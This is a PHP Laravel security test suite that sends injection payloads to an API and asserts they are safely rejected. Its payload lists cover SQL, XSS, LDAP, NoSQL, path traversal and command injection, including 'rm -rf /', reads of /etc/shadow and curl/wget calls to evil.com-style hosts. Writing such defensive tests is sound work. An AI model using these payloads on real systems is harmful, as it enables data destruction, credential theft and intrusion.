<?php

namespace Tests\Security;

use Tests\TestCase;
use App\Models\User;
use App\Models\ApiToken;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;

/**
 * 輸入驗證和SQL注入防護測試
 * 
 * 測試系統對各種惡意輸入的防護能力
 */
class InputValidationSecurityTest extends TestCase
{
    use RefreshDatabase;

    /**
     * 測試使用者
     * 
     * @var User
     */
    protected User $testUser;

    /**
     * 測試Token
     * 
     * @var string
     */
    protected string $testToken;

    /**
     * 設定測試環境
     */
    protected function setUp(): void
    {
        parent::setUp();

        $this->testUser = User::factory()->create([
            'name' => '輸入驗證測試使用者',
            'email' => 'input-validation-test@example.com',
        ]);

        $tokenData = ApiToken::createToken(
            $this->testUser->id,
            '輸入驗證測試Token',
            ['*']
        );
        $this->testToken = $tokenData['token'];
    }

    /**
     * 測試SQL注入防護
     */
    public function test_sql_injection_protection()
    {
        $sqlInjectionPayloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' OR 1=1 --",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users (name, email) VALUES ('hacker', 'hack@evil.com'); --",
            "' OR EXISTS(SELECT * FROM users WHERE email='admin@example.com') --",
            "1'; UPDATE users SET email='hacked@evil.com' WHERE id=1; --",
            "' OR (SELECT COUNT(*) FROM users) > 0 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR SLEEP(5) --",
        ];

        foreach ($sqlInjectionPayloads as $payload) {
            // 測試action_type參數的SQL注入防護
            $response = $this->postJson('/api/', [
                'action_type' => $payload
            ], [
                'Authorization' => 'Bearer ' . $this->testToken
            ]);

            // 應該回傳驗證錯誤或找不到Action，而不是SQL錯誤
            $this->assertContains($response->status(), [400, 401, 403, 404, 422]);
            
            // 確保不會有SQL錯誤洩漏
            $responseContent = $response->getContent();
            $this->assertStringNotContainsStringIgnoringCase('sql', $responseContent);
            $this->assertStringNotContainsStringIgnoringCase('mysql', $responseContent);
            $this->assertStringNotContainsStringIgnoringCase('database', $responseContent);

            // 測試user_id參數的SQL注入防護
            $response = $this->postJson('/api/', [
                'action_type' => 'user.info',
                'user_id' => $payload
            ], [
                'Authorization' => 'Bearer ' . $this->testToken
            ]);

            // 應該回傳驗證錯誤
            $this->assertContains($response->status(), [400, 401, 403, 422]);
        }

        // 驗證資料庫完整性
        $userCount = User::count();
        $this->assertGreaterThan(0, $userCount, '資料庫應該仍然包含使用者資料');
        
        // 驗證測試使用者仍然存在且未被修改
        $testUser = User::find($this->testUser->id);
        $this->assertNotNull($testUser);
        $this->assertEquals('input-validation-test@example.com', $testUser->email);
    }

    /**
     * 測試XSS防護
     */
    public function test_xss_protection()
    {
        $xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<svg onload="alert(1)">',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<body onload="alert(\'XSS\')">',
            '<div onclick="alert(\'XSS\')">Click me</div>',
            '<input type="text" value="" onfocus="alert(\'XSS\')" autofocus>',
            '<a href="javascript:alert(\'XSS\')">Click</a>',
            '"><script>alert("XSS")</script>',
        ];

        foreach ($xssPayloads as $payload) {
            $response = $this->postJson('/api/', [
                'action_type' => 'user.info',
                'malicious_param' => $payload
            ], [
                'Authorization' => 'Bearer ' . $this->testToken
            ]);

            $responseContent = $response->getContent();
            
            // 確保惡意腳本不會在回應中執行
            $this->assertStringNotContainsString('<script>', $responseContent);
            $this->assertStringNotContainsString('javascript:', $responseContent);
            $this->assertStringNotContainsString('onerror=', $responseContent);
            $this->assertStringNotContainsString('onload=', $responseContent);
            $this->assertStringNotContainsString('onclick=', $responseContent);
            
            // 如果包含HTML標籤，應該被適當編碼或過濾
            if (str_contains($payload, '<')) {
                $this->assertStringNotContainsString($payload, $responseContent);
            }
        }
    }

    /**
     * 測試命令注入防護
     */
    public function test_command_injection_protection()
    {
        $commandInjectionPayloads = [
            '; ls -la',
            '| cat /etc/passwd',
            '&& rm -rf /',
            '`whoami`',
            '$(id)',
            '; ping -c 1 google.com',
            '| nc -l 4444',
            '&& curl http://evil.com/steal?data=',
            '; wget http://malicious.com/backdoor.sh',
            '`cat /etc/shadow`',
        ];

        foreach ($commandInjectionPayloads as $payload) {
            $response = $this->postJson('/api/', [
                'action_type' => 'user.info',
                'command_param' => $payload
            ], [
                'Authorization' => 'Bearer ' . $this->testToken
            ]);

            // 系統應該正常回應，不執行命令
            $this->assertContains($response->status(), [200, 400, 401, 403, 422]);
            
            $responseContent = $response->getContent();
            
            // 確保沒有命令執行結果洩漏
            $this->assertStringNotContainsString('root:', $responseContent);
            $this->assertStringNotContainsString('/bin/bash', $responseContent);
            $this->assertStringNotContainsString('uid=', $responseContent);
            $this->assertStringNotContainsString('gid=', $responseContent);
        }
    }

    /**
     * 測試路徑遍歷攻擊防護
     */
    public function test_path_traversal_protection()
    {
        $pathTraversalPayloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/passwd',
            'C:\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%252F..%252F..%252Fetc%252Fpasswd',
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '/var/www/html/../../../etc/passwd',
            'file:///etc/passwd',
        ];

        foreach ($pathTraversalPayloads as $payload) {
            $response = $this->postJson('/api/', [
                'action_type' => 'user.info',
                'file_param' => $payload
            ], [
                'Authorization' => 'Bearer ' . $this->testToken
            ]);

            $responseContent = $response->getContent();
            
            // 確保沒有系統檔案內容洩漏
            $this->assertStringNotContainsString('root:x:', $responseContent);
            $this->assertStringNotContainsString('daemon:', $responseContent);
            $this->assertStringNotContainsString('[boot loader]', $responseContent);
            $this->assertStringNotContainsString('Windows Registry', $responseContent);
        }
    }

    /**
     * 測試LDAP注入防護
     */
    public function test_ldap_injection_protection()
    {
        $ldapInjectionPayloads = [
            '*)(uid=*',
            '*)(|(uid=*))',
            '*)(&(uid=*)',
            '*))%00',
            '*()|%26',
            '*)(objectClass=*',
            '*))(|(objectClass=*',
            '*)(cn=*)',
            '*)(&(objectClass=user)(uid=*',
            '*)(mail=*@*',
        ];

        foreach ($ldapInjectionPayloads as $payload) {
            $response = $this->postJson('/api/', [
                'action_type' => 'user.info',
                'search_param' => $payload
            ], [
                'Authorization' => 'Bearer ' . $this->testToken
            ]);

            // 系統應該正常處理，不洩漏LDAP資訊
            $responseContent = $response->getContent();
            $this->assertStringNotContainsString('ldap', strtolower($responseContent));
            $this->assertStringNotContainsString('distinguished name', strtolower($responseContent));
        }
    }

    /**
     * 測試NoSQL注入防護
     */
    public function test_nosql_injection_protection()
    {
        $nosqlInjectionPayloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "this.name == this.name"}',
            '{"$or": [{"name": "admin"}, {"name": "root"}]}',
            '{"name": {"$regex": "^admin"}}',
            '{"$expr": {"$gt": [{"$strLenCP": "$name"}, 0]}}',
            '{"password": {"$ne": "wrong"}}',
            '{"$and": [{"name": {"$exists": true}}, {"password": {"$exists": true}}]}',
            '{"name": {"$in": ["admin", "root", "administrator"]}}',
        ];

        foreach ($nosqlInjectionPayloads as $payload) {
            $response = $this->postJson('/api/', [
                'action_type' => 'user.info',
                'query_param' => $payload
            ], [
                'Authorization' => 'Bearer ' . $this->testToken
            ]);

            // 系統應該正常處理JSON字串，不執行NoSQL查詢
            $this->assertContains($response->status(), [200, 400, 401, 403, 422]);
        }
    }

    /**
     * 測試大型輸入攻擊防護
     */
    public function test_large_input_protection()
    {
        // 測試超大字串
        $largeString = str_repeat('A', 1024 * 1024); // 1MB字串

        $response = $this->postJson('/api/', [
            'action_type' => 'user.info',
            'large_param' => $largeString
        ], [
            'Authorization' => 'Bearer ' . $this->testToken
        ]);

        // 系統應該拒絕過大的輸入或正常處理
        $this->assertContains($response->status(), [200, 400, 401, 403, 413, 422]);

        // 測試大量參數
        $manyParams = [];
        for ($i = 0; $i < 1000; $i++) {
            $manyParams["param_{$i}"] = "value_{$i}";
        }
        $manyParams['action_type'] = 'user.info';

        $response = $this->postJson('/api/', $manyParams, [
            'Authorization' => 'Bearer ' . $this->testToken
        ]);

        $this->assertContains($response->status(), [200, 400, 401, 403, 413, 422]);
    }

    /**
     * 測試特殊字元處理
     */
    public function test_special_character_handling()
    {
        $specialCharacters = [
            "\x00", // NULL字元
            "\x01", // SOH字元
            "\x02", // STX字元
            "\x1F", // Unit Separator
            "\x7F", // DEL字元
            "\xFF", // 高位字元
            "🚀", // Emoji
            "中文", // 中文字元
            "العربية", // 阿拉伯文
            "русский", // 俄文
            "日本語", // 日文
            "한국어", // 韓文
        ];

        foreach ($specialCharacters as $char) {
            $response = $this->postJson('/api/', [
                'action_type' => 'user.info',
                'special_char' => $char
            ], [
                'Authorization' => 'Bearer ' . $this->testToken
            ]);

            // 系統應該能正常處理特殊字元
            $this->assertContains($response->status(), [200, 400, 401, 403, 422]);
            
            // 確保回應是有效的JSON
            $this->assertJson($response->getContent());
        }
    }

    /**
     * 測試編碼攻擊防護
     */
    public function test_encoding_attack_protection()
    {
        $encodingAttacks = [
            '%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E', // URL編碼的XSS
            '%253Cscript%253E', // 雙重URL編碼
            '&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;', // HTML實體編碼
            '\u003cscript\u003e', // Unicode編碼
            '%u003cscript%u003e', // Unicode URL編碼
            '\x3cscript\x3e', // 十六進位編碼
            'eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))', // 字元碼編碼
        ];

        foreach ($encodingAttacks as $attack) {
            $response = $this->postJson('/api/', [
                'action_type' => 'user.info',
                'encoded_param' => $attack
            ], [
                'Authorization' => 'Bearer ' . $this->testToken
            ]);

            $responseContent = $response->getContent();
            
            // 確保編碼攻擊不會被執行
            $this->assertStringNotContainsString('<script>', $responseContent);
            $this->assertStringNotContainsString('alert(', $responseContent);
            $this->assertStringNotContainsString('eval(', $responseContent);
        }
    }

    /**
     * 測試JSON注入防護
     */
    public function test_json_injection_protection()
    {
        $jsonInjectionPayloads = [
            '{"action_type": "malicious.action"}',
            '", "injected_field": "malicious_value", "original_field": "',
            '\\", \\"injected\\": \\"value\\", \\"',
            '{"$ref": "http://evil.com/malicious.json"}',
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',
        ];

        foreach ($jsonInjectionPayloads as $payload) {
            $response = $this->postJson('/api/', [
                'action_type' => 'user.info',
                'json_param' => $payload
            ], [
                'Authorization' => 'Bearer ' . $this->testToken
            ]);

            // 系統應該正常處理，不執行注入的JSON
            $this->assertContains($response->status(), [200, 400, 401, 403, 422]);
            
            $responseContent = $response->getContent();
            $this->assertStringNotContainsString('malicious.action', $responseContent);
            $this->assertStringNotContainsString('injected_field', $responseContent);
        }
    }

    /**
     * 測試參數污染攻擊防護
     */
    public function test_parameter_pollution_protection()
    {
        // 測試重複參數
        $response = $this->call('POST', '/api/', [
            'action_type' => 'user.info',
            'action_type' => 'malicious.action', // 重複的action_type
            'user_id' => '1',
            'user_id' => '999', // 重複的user_id
        ], [], [], [
            'HTTP_Authorization' => 'Bearer ' . $this->testToken,
            'CONTENT_TYPE' => 'application/json',
        ]);

        // 系統應該正常處理重複參數
        $this->assertContains($response->status(), [200, 400, 401, 403, 422]);
        
        // 確保不會執行惡意Action
        $responseContent = $response->getContent();
        $this->assertStringNotContainsString('malicious.action', $responseContent);
    }

    /**
     * 測試資料庫查詢日誌安全性
     */
    public function test_database_query_log_security()
    {
        // 啟用查詢日誌
        DB::enableQueryLog();

        // 執行包含敏感資料的請求
        $response = $this->postJson('/api/', [
            'action_type' => 'user.info',
            'sensitive_data' => 'password123'
        ], [
            'Authorization' => 'Bearer ' . $this->testToken
        ]);

        $queries = DB::getQueryLog();

        // 檢查查詢日誌中是否洩漏敏感資訊
        foreach ($queries as $query) {
            $this->assertStringNotContainsString('password123', $query['query']);
            $this->assertStringNotContainsString($this->testToken, $query['query']);
        }

        DB::disableQueryLog();
    }
}